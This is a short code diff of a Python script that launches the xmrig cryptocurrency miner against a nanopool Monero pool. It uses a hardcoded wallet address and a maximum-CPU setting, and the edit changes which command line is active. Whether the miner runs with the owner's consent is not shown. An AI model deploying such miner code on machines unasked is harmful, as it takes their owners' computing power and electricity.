@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-import multiprocessing
+#import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -35,8 +35,8 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
-#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100'
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
